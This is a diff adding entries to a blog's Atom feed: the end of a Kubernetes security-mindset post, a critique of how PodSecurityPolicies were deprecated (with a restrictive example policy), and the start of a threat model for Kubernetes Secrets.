+&lt;li&gt;&lt;strong&gt;I really need some kind of intrusion detection system.&lt;&#x2F;strong&gt; It&#x27;s very difficult to get proper &amp;quot;defense in depth&amp;quot; for Kubernetes since one slip-up is game over (the attacker gains remote code execution). As a result, you at least need to know when you&#x27;ve been breached. &lt;a href=&quot;https:&#x2F;&#x2F;falco.org&#x2F;&quot;&gt;Falco&lt;&#x2F;a&gt; is one example of a Kubernetes-native IDS.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Maybe I shouldn&#x27;t put all my eggs in one basket.&lt;&#x2F;strong&gt; If one little mistake can lead to RCE, then running multiple clusters may help reduce the blast radius. But be careful: multi-cluster tooling can be complex, so make sure the added complexity isn&#x27;t just increasing the attack surface for no reason.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;With the popularity of Kubernetes and the backing of big companies with huge security teams, it&#x27;s easy to be lulled into a false sense of security. Having the right mindset can help motivate you to take Kubernetes security as seriously as its RCE-aaS design demands.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;conclusions&quot;&gt;Conclusions&lt;&#x2F;h2&gt;
+&lt;p&gt;The goal of this post is to spread awareness of the depth that Kubernetes security can reach sometimes. As professionals, it&#x27;s our duty to communicate the scope of new projects, including the security risks and the work required to mitigate them. All too often, I see this duty being neglected or offloaded to flashy security tools that don&#x27;t solve the real issues. Because the real issue are often too organization-specific (section 1), too cutting-edge (section 2), or too abstract (section 3) to be documented anywhere.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>The Fumbled Deprecation of PodSecurityPolicies</title>
+		<published>2022-05-08T00:00:00+00:00</published>
+		<updated>2022-05-08T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2022/psp-deprecation/" type="text/html"/>
+		<id>/blog/2022/psp-deprecation/</id>
+		<content type="html">&lt;p&gt;In &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;kubernetes&#x2F;pull&#x2F;7893&quot;&gt;2016&lt;&#x2F;a&gt;, Kubernetes v1.3 was released which included a new API type: PodSecurityPolicies (PSPs). The original &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;design-proposals-archive&#x2F;blob&#x2F;main&#x2F;auth&#x2F;pod-security-policy.md&quot;&gt;design proposal&lt;&#x2F;a&gt; had the lofty goal of allowing cluster admins to restrict various Linux privileges to some Pods while still allowing other Pods to use them. PSPs filled an important security hole where having the ability to run pods could let you bypass every other security control in the cluster.&lt;&#x2F;p&gt;
+&lt;p&gt;But in 2021, after 5 years of PSPs still being considered &amp;quot;beta&amp;quot;, they were &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;blog&#x2F;2021&#x2F;04&#x2F;06&#x2F;podsecuritypolicy-deprecation-past-present-and-future&#x2F;&quot;&gt;deprecated&lt;&#x2F;a&gt;. The maintainers had their &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;SFtHRmPuhEw?t=963&quot;&gt;reasons&lt;&#x2F;a&gt;, but in the year since this deprecation, I believe it was mismanaged for a number of reasons.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;what-are-podsecuritypolicies-psps&quot;&gt;What are PodSecurityPolicies (PSPs)?&lt;&#x2F;h2&gt;
+&lt;details&gt;
+&lt;summary&gt;Click to expand if you don&#x27;t know what they are already&lt;&#x2F;summary&gt;
+&lt;p&gt;The Official docs are &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;security&#x2F;pod-security-policy&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;, but PSPs are essentially yaml files that restrict &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;tasks&#x2F;configure-pod-container&#x2F;security-context&#x2F;&quot;&gt;some special permissions&lt;&#x2F;a&gt; that Pods can have such as allowed UIDs&#x2F;GIDs, &lt;code&gt;allowPrivilegeEscalation&lt;&#x2F;code&gt;, hostPath mounts, Linux Capabilities, etc. These permissions are extremely important to control since most any one of them could be used to break out of the container sandbox in some way.&lt;&#x2F;p&gt;
+&lt;p&gt;Here&#x27;s an example PSP that implements the CIS Benchmarks for Kubernetes:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;yaml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-yaml &quot;&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;apiVersion&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;policy&#x2F;v1beta1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;kind&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;PodSecurityPolicy
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;metadata&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;annotations&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# https:&#x2F;&#x2F;docs.docker.com&#x2F;engine&#x2F;security&#x2F;seccomp&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;seccomp.security.alpha.kubernetes.io&#x2F;allowedProfileNames&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;docker&#x2F;default,runtime&#x2F;default
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;seccomp.security.alpha.kubernetes.io&#x2F;defaultProfileName&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;runtime&#x2F;default
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;restricted
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;spec&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# CIS 5.2.1
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;privileged&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# CIS 5.2.2
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hostPID&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# CIS 5.2.3
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hostIPC&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# CIS 5.2.4
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hostNetwork&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# CIS 5.2.5
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;allowPrivilegeEscalation&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# CIS 5.2.6
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;runAsUser&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rule&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;MustRunAsNonRoot
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# CIS 5.2.7&#x2F;8&#x2F;9
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;requiredDropCapabilities&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;  - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ALL
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Needed to stop hostPath mounts, surprisingly not mentioned in CIS Benchmarks
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;volumes&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;  - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;configMap
+&lt;&#x2F;span&gt;&lt;span&gt;  - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;emptyDir
+&lt;&#x2F;span&gt;&lt;span&gt;  - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;projected
+&lt;&#x2F;span&gt;&lt;span&gt;  - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;secret
+&lt;&#x2F;span&gt;&lt;span&gt;  - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;downwardAPI
+&lt;&#x2F;span&gt;&lt;span&gt;  - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;persistentVolumeClaim
+&lt;&#x2F;span&gt;&lt;span&gt;  - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ephemeral
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;As far as I know, any Pod that is bound by that PSP will not be able to escape the container sandbox (except via a new zero-day, of course).&lt;&#x2F;p&gt;
+&lt;p&gt;Once PSPs are enabled and you have deployed some policies (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes-sigs&#x2F;kubespray&#x2F;blob&#x2F;323a1113629b7cea77d18a80196e4a2544f747bc&#x2F;roles&#x2F;kubernetes-apps&#x2F;cluster_roles&#x2F;tasks&#x2F;main.yml#L43&quot;&gt;here&#x27;s&lt;&#x2F;a&gt; how Kubespray does it), every new Pod will be checked against your PSPs. There are some complex rules about which policy is eventually applied to your pod (Pod SA, user&#x27;s SA, prefer non-mutating, then alphabetical), but essentially your Pod will either be allowed, mutated-then-allowed, or blocked. To help debug, Pods will be given a &lt;code&gt;kubernetes.io&#x2F;psp&lt;&#x2F;code&gt; annotation which tells you which policy was applied.&lt;&#x2F;p&gt;
+&lt;p&gt;Applications can ship their own PodSecurityPolicies if they need special permissions, such as &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;ingress-nginx&#x2F;blob&#x2F;helm-chart-4.1.0&#x2F;charts&#x2F;ingress-nginx&#x2F;templates&#x2F;controller-psp.yaml&quot;&gt;this one&lt;&#x2F;a&gt; that ships with ingress-nginx.&lt;&#x2F;p&gt;
+&lt;&#x2F;details&gt;
+&lt;h2 id=&quot;reason-1-psps-really-weren-t-that-bad&quot;&gt;Reason 1: PSPs really weren&#x27;t that bad&lt;&#x2F;h2&gt;
+&lt;p&gt;While it&#x27;s true there are usability&#x2F;complexity concerns with PodSecurityPolicies, I believe this just reflects the fact that container security is a complex subject. Even after a year of dealing with this stuff, I&#x27;m still learning new and troubling ways that attackers can break out of containers.&lt;&#x2F;p&gt;
+&lt;p&gt;That necessarily means there are a lot of knobs to tweak. In the video where sig-auth announces plans to deprecate PSPs, &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;SFtHRmPuhEw?t=1921&quot;&gt;they say&lt;&#x2F;a&gt; &amp;quot;&amp;gt;90% of users care about 2-3 policies&amp;quot;. I agree, but any policy mechanism should care a LOT about that last 10% since that&#x27;s where the true, unavoidable complexity lies. This barrier to entry will always be present no matter what implementation we choose.&lt;&#x2F;p&gt;
+&lt;p&gt;Additionally, three problems were explicitly mentioned in the sig-auth video: 1) flawed authentication model, 2) difficult to roll out, and 3) inconsistent&#x2F;unbounded API. These problems don&#x27;t come across to me as insurmountable technical obstacles. They just seem like regular constraints&#x2F;tradeoffs that any complex software needs to handle. And indeed they acknowledge that one possible option is to fix these issues rather than deprecating PSPs all together.&lt;&#x2F;p&gt;
+&lt;p&gt;So in summary, PodSecurityPolicies are definitely imperfect, but not so deeply flawed as to warrant deprecation. Yes, we&#x27;d have to break backwards compatibility to fix some imperfections (like enabling PSPs by default), but that should be expected from a &amp;quot;beta&amp;quot; API.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;reason-2-replacements-for-psps-weren-t-ready-yet&quot;&gt;Reason 2: Replacements for PSPs weren&#x27;t ready yet&lt;&#x2F;h2&gt;
+&lt;p&gt;PSPs were officially deprecated with the release of Kubernetes v1.21, which happened on April 8th, 2021. While PSPs will not be &lt;em&gt;removed&lt;&#x2F;em&gt; until v1.25, deprecation means that new clusters probably shouldn&#x27;t use PSPs. But what should you use instead? That question did not have an official answer until more than a month later when the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;enhancements&#x2F;pull&#x2F;2582&quot;&gt;PSP Replacement KEP&lt;&#x2F;a&gt; was officially merged. But that was just a proposal. The implementation (&lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;security&#x2F;pod-security-admission&#x2F;&quot;&gt;Pod Security Admission controller&lt;&#x2F;a&gt;, PSA) wouldn&#x27;t enter &amp;quot;beta&amp;quot; status until v1.23, &lt;em&gt;8 months&lt;&#x2F;em&gt; after PSPs were deprecated.&lt;&#x2F;p&gt;
+&lt;p&gt;While that Pod Security Admission controller was the official, in-tree replacement, the deprecation announcement &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;blog&#x2F;2021&#x2F;04&#x2F;06&#x2F;podsecuritypolicy-deprecation-past-present-and-future&#x2F;&quot;&gt;blog post&lt;&#x2F;a&gt; pointed to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;open-policy-agent&#x2F;gatekeeper&quot;&gt;Gatekeeper&lt;&#x2F;a&gt; as an unofficial replacement. But Gatekeeper was missing an important feature that was present in PSPs: the ability to mutate pods. Coincidentally, Gatekeeper &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;open-policy-agent&#x2F;gatekeeper&#x2F;releases&#x2F;tag&#x2F;v3.4.0&quot;&gt;released&lt;&#x2F;a&gt; &amp;quot;alpha&amp;quot; support for mutation on the same day PSPs were deprecated, which didn&#x27;t become &amp;quot;beta&amp;quot; for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;open-policy-agent&#x2F;gatekeeper&#x2F;releases&#x2F;tag&#x2F;v3.7.0&quot;&gt;another 7 months&lt;&#x2F;a&gt; where it remains to this day.&lt;&#x2F;p&gt;
+&lt;p&gt;So anyone deploying new clusters between April and November 2021 had to choose between deprecated software (PSPs) and alpha software (PSA or Gatekeeper) to fix this important security issue. I was one of those people, hence this rant :)&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;reason-3-a-de-facto-standard-is-not-a-standard&quot;&gt;Reason 3: A de-facto standard is not a standard&lt;&#x2F;h2&gt;
+&lt;p&gt;This is not the first time Kubernetes has left an important niche to third-party software. The Container Runtime Interface (CRI), Container Networking Interface (CNI), Container Storage Interface (CSI), Cloud Controller Manager (CCM), and the Ingress Controller interfaces have all been successful as far as I can tell. These interfaces allow for multiple vendors to supply compatible plugins that users can (more or less) switch between easily. But no such standard interface was created for PodSecurityPolicies, and so the ecosystem is now fragmented.&lt;&#x2F;p&gt;
+&lt;p&gt;While Gatekeeper is officially &amp;quot;graduated&amp;quot; according to the CNCF (Kubernetes&#x27; parent organization), a startup named Nirmata develops &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kyverno&#x2F;kyverno&quot;&gt;Kyverno&lt;&#x2F;a&gt;, which is almost equally popular and fills the same niche as Gatekeeper as a PSP replacement. Gatekeeper and Kyverno have wildly incompatible policy languages, which means application vendors can no longer ship PSP-related rule exceptions along side their applications like they can with e.g. Ingresses, NetworkPolicies, etc.&lt;&#x2F;p&gt;
+&lt;p&gt;So if you want to install e.g. a log collector, you can&#x27;t just &lt;code&gt;helm install&lt;&#x2F;code&gt; it anymore like you could if the helm chart included PSPs. You have to go tweak your Gatekeeper&#x2F;Kyverno policies over and over until the pods finally run. And now you are locked-in to either Gatekeeper or Kyverno&#x27;s policy language.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;reason-4-this-has-already-caused-a-zero-day&quot;&gt;Reason 4: This has already caused a zero-day&lt;&#x2F;h2&gt;
+&lt;p&gt;In Kubernetes v1.23, &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;workloads&#x2F;pods&#x2F;ephemeral-containers&#x2F;&quot;&gt;ephemeral containers&lt;&#x2F;a&gt; were enabled by default. This presents a challenge to Gatekeeper&#x2F;Kyverno since its one extra field in a Pod that they need to validate.&lt;&#x2F;p&gt;
+&lt;p&gt;Unfortunately, at the time of writing Gatekeeper&#x27;s PSP replacement policies &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;open-policy-agent&#x2F;gatekeeper-library&#x2F;issues&#x2F;188&quot;&gt;still do not validate ephemeral containers&lt;&#x2F;a&gt;! Any v1.23 cluster which migrated from PSPs to Gatekeeper now has no protection against privileged pods! That&#x27;s a 5+ month lag time! &lt;a href=&quot;https:&#x2F;&#x2F;xenitab.github.io&#x2F;blog&#x2F;2022&#x2F;04&#x2F;12&#x2F;ephemeral-container-security&#x2F;&quot;&gt;Another user&lt;&#x2F;a&gt; found that Kyverno also had a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kyverno&#x2F;kyverno&#x2F;releases&#x2F;tag&#x2F;v1.5.3&quot;&gt;1 month lag time&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;In contrast, both PSPs and PSA were updated to check ephemeral containers before v1.23 was released (PSPs: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;kubernetes&#x2F;pull&#x2F;59416&#x2F;files#diff-40853a2fe474b6bde454934dc4e0742a3d9bbf98c31336d8d74520ebe8a2e300R48&quot;&gt;&lt;code&gt;util.go&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;. PSA: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;kubernetes&#x2F;blob&#x2F;v1.22.0&#x2F;staging&#x2F;src&#x2F;k8s.io&#x2F;pod-security-admission&#x2F;policy&#x2F;visitor.go#L34&quot;&gt;&lt;code&gt;visitor.go&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;). This is the benefit of being &amp;quot;in-tree&amp;quot; that Gatekeeper&#x2F;Kyverno can&#x27;t have. If there was at least a standard interface like CSI&#x2F;CRI&#x2F;CNI, that may have helped prevent this.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;takeaways&quot;&gt;Takeaways&lt;&#x2F;h2&gt;
+&lt;p&gt;I want to clarify that I don&#x27;t think less highly of the various parties involved in the PSP deprecation process. PSPs did require &lt;em&gt;some&lt;&#x2F;em&gt; kind of change, and sig-auth&#x27;s reasoning at the time was solid. I&#x27;m only able to make my argument with the clarity of hindsight.&lt;&#x2F;p&gt;
+&lt;p&gt;Since it&#x27;s too late to stop the PSP deprecation anyway (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;kubernetes&#x2F;pull&#x2F;109798&quot;&gt;merged 4 days ago&lt;&#x2F;a&gt;), I intend this post to just be a post-mortem, with the following lessons-learned:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Don&#x27;t be afraid to make backwards-incompatible changes to beta APIs, especially if it&#x27;s in the name of security.&lt;&#x2F;li&gt;
+&lt;li&gt;Deeply consider how the whole ecosystem will react to a given change since it moves so slowly.&lt;&#x2F;li&gt;
+&lt;li&gt;Learn from the success of the &amp;quot;Container * Interfaces&amp;quot;. They can prevent ecosystem fragmentation and compatibility issues.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Plain Kubernetes Secrets are fine</title>
+		<published>2022-04-30T00:00:00+00:00</published>
+		<updated>2022-04-30T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2022/k8s-secrets/" type="text/html"/>
+		<id>/blog/2022/k8s-secrets/</id>
+		<content type="html">&lt;p&gt;It&#x27;s no secret that Kubernetes Secrets are just base64-encoded strings stored in etcd alongside the rest of the cluster&#x27;s state. Ever since the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;kubernetes&#x2F;pull&#x2F;4514&quot;&gt;introduction of Secrets in 2015&lt;&#x2F;a&gt;, armchair security experts have been scoffing at this decision and seeking alternatives. I think those people are missing the point.&lt;&#x2F;p&gt;
+&lt;p&gt;The design of the Secrets API dates back to before Kubernetes v0.12. In &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kubernetes&#x2F;kubernetes&#x2F;issues&#x2F;2030#issuecomment-61584588&quot;&gt;a thread the predates the original design document&lt;&#x2F;a&gt;, there&#x27;s a line that hints at why people might be confused by Secrets:&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Its hard to evaluate these alternatives without a threat model&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;That&#x27;s exactly the issue. The naive approach to securing software is to blindly implement a checklist of security features. But a deeper understanding of security will quickly uncover that perfect security is impossible; you have to make trade-offs and prioritize the most likely scenarios. Creating a &lt;a href=&quot;https:&#x2F;&#x2F;owasp.org&#x2F;www-community&#x2F;Threat_Modeling_Process&quot;&gt;threat model&lt;&#x2F;a&gt; can help you make those decisions. Let&#x27;s create a rudimentary threat model for Kubernetes Secrets and see what comes up.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;a-simple-threat-model-for-kubernetes-secrets&quot;&gt;A simple threat model for Kubernetes Secrets&lt;&#x2F;h2&gt;
+&lt;h4 id=&quot;what-are-we-protecting&quot;&gt;What are we protecting?&lt;&#x2F;h4&gt;
+&lt;p&gt;Secrets are generally used to store things like database passwords and private keys meaning they are a high-value target.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;what-does-a-security-failure-look-like&quot;&gt;What does a security failure look like?&lt;&#x2F;h4&gt;
+&lt;p&gt;If an attacker is able to read a secret, they can use it to perform further attacks such as stealing data, modifying&#x2F;deleting&#x2F;ransoming data, or gaining authorization to do things like spawn pods that mine crypto. Normally we&#x27;d use something like &lt;a href=&quot;https:&#x2F;&#x2F;wiki.openstack.org&#x2F;wiki&#x2F;Security&#x2F;OSSA-Metrics#DREAD&quot;&gt;DREAD&lt;&#x2F;a&gt; to rank the severity of different attacks, but exposing secrets is somewhat binary unless we have a specific secret in mind.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;how-can-secrets-be-stolen-what-can-go-wrong&quot;&gt;How can secrets be stolen (what can go wrong)?&lt;&#x2F;h4&gt;
+&lt;p&gt;At a bare minimum, secrets need to exist in plaintext in the memory of whatever application needs it, where it can (&lt;a href=&quot;https:&#x2F;&#x2F;git.kernel.org&#x2F;pub&#x2F;scm&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;next&#x2F;linux-next.git&#x2F;commit&#x2F;?id=72101855fb9a2b3cd72c051791609a217c4a6281&quot;&gt;almost&lt;&#x2F;a&gt;) &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;n1nj4sec&#x2F;mimipy&quot;&gt;always&lt;&#x2F;a&gt; be stolen by another process on the same node with enough perseverance. We also need to store the secret somewhere persistent. In our case, secrets are stored inside etcd and accessible from the Kubernetes API.&lt;&#x2F;p&gt;
+&lt;p&gt;Since the secret must exist in those two places, they can be stolen in any of the following ways:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;A malicious process on the same node (scan memory, or if not enforcing securityContexts, read straight from &#x2F;proc or the CRI)&lt;&#x2F;li&gt;
+&lt;li&gt;Root access to a control plane node (read etcd&#x27;s memory, read the on-disk dump, or steal a client cert and connect directly)&lt;&#x2F;li&gt;
+&lt;li&gt;Root access to a worker node (steal kubelet&#x27;s client cert and read the secret from the API server, or read the secret file&#x2F;env var directly)&lt;&#x2F;li&gt;
+&lt;li&gt;Access to the physical server of a control plane node (plug the hard drive into another computer and read the etcd data or just dump the RAM)&lt;&#x2F;li&gt;
+&lt;li&gt;Future unexpected attacks (this is a catch-all which helps us pick solutions that have a smaller attack surface)&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;Some of the more eccentric hacks like social engineering, malicious insider, human error&#x2F;misconfiguration, or hardware supply chain attacks are of course possible, but outside the scope of what Kubernetes can fix realistically.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;how-can-we-prevent-those-attacks&quot;&gt;How can we prevent those attacks?&lt;&#x2F;h4&gt;
+&lt;p&gt;For Attack #1: Stealing secrets from memory is a risk we&#x27;re forced to tolerate. Applications could use auto-expiring tokens or multi-factor authentication, but those features are out of scope since they are application-dependent.&lt;&#x2F;p&gt;
+&lt;p&gt;For Attack #2 and #3: Root access to nodes is a huge concern. This can be mitigated by general server hardening, patching, and &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;security&#x2F;pod-security-standards&#x2F;&quot;&gt;preventing privileged pods from running&lt;&#x2F;a&gt;, but this is a very complex threat to address.&lt;&#x2F;p&gt;
+&lt;p&gt;For Attack #4: Access to physical server can be somewhat be mitigated by encrypting disks at rest. Crucially, the encryption key MUST be stored in a separate security domain to get any security benefit. But since physical access is typically game-over, you just need some serious physical security.&lt;&#x2F;p&gt;
+&lt;p&gt;For Attack #5: Here is where we have to gamble on future zero-days appearing. We can raise our chances by choosing simpler and well-tested methods, and it doesn&#x27;t get much simpler than plain Kubernetes Secrets.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;takeaways-from-the-threat-model&quot;&gt;Takeaways from the threat model&lt;&#x2F;h2&gt;
+&lt;p&gt;The threat model exposes an inconvenient truth that storing secrets is hard since the plaintext version has to exist somewhere (in contrast to e.g. password hashes). That&#x27;s just the problem with reversible encryption.&lt;&#x2F;p&gt;
+&lt;p&gt;Any improvement on the existing Secrets implementation would have to mitigate more of those attacks, but I posit that none of the proposed alternatives to plain Kubernetes Secrets offer enough extra security to be worth the hassle.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;alternatives-to-kubernetes-secrets&quot;&gt;Alternatives to Kubernetes Secrets&lt;&#x2F;h2&gt;
+&lt;p&gt;Let&#x27;s looks at some of the alternatives that exist and see how they measure up.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;etcd-encryption-at-rest&quot;&gt;Etcd encryption at rest&lt;&#x2F;h4&gt;
+&lt;p&gt;I&#x27;m shocked this is still the &lt;a href=&quot;https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;configuration&#x2F;secret&#x2F;#alternatives-to-secrets&quot;&gt;#1 recommended alternative&lt;&#x2F;a&gt; considering how wildly useless it is.&lt;&#x2F;p&gt;
